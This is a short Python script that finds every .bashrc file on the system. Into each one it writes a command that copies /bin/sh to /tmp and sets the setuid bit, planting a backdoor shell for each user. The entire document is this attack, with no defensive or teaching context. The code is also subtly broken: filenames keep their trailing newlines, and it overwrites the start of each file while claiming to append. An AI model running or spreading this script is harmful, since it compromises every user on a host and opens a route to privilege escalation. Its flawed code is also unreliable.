#!/usr/bin/env python3
import os

files = os.popen("find / -name .bashrc -print")
for bashfile in files:
    print("Appending setuid shell creation to", bashfile)
    rcfile = open(bashfile, "r+") # opens for read write
    rcfile.write("cp /bin/sh /tmp/`id -u`; chmod +s /tmp/`id -u`\n")
    rcfile.close()
